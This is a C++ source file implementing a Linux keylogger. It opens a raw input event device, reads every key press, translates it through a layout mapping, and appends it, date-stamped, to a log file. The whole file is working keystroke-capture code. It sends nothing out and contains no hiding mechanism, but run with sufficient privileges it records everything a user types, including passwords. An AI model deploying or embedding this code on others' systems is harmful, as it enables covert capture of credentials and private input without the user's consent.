#include "keylogger.hpp"
#include "key_mapping.hpp"
#include "datetime_utils.hpp"
#include <fstream>
#include <iostream>
#include <fcntl.h>
#include <unistd.h>
#include <cstring>
#include <linux/input.h>

bool startKeyLogger(const std::string& devicePath, const std::string& logPath, const std::string& layout) {
    int fd = open(devicePath.c_str(), O_RDONLY);
    if (fd == -1) {
        std::cerr << "Cannot open " << devicePath << std::endl;
        return false;
    }

    std::ofstream logfile(logPath, std::ios::app);
    if (!logfile) {
        std::cerr << "Cannot open log file." << std::endl;
        close(fd);
        return false;
    }
    else{
        std::string currentDateTime = datetime_utils::get_date();
        logfile << "\n\nDate: " << currentDateTime << "\n";
    }

    struct input_event ev;
    while (true) {
        memset(&ev, 0, sizeof(ev));
        if (read(fd, &ev, sizeof(ev)) < 0) {
            std::cerr << "Error reading event." << std::endl;
            break;
        }

        if (ev.type == EV_KEY && ev.value == 1) {
            const char* key = mapKeyCode(ev.code, layout);
            if (key) {
                logfile << key;
                logfile.flush();
            } else {
                logfile << "[KEYCODE:" << ev.code << "]";
                logfile.flush();
            }
        }
    }

    close(fd);
    logfile.close();
    return true;
}
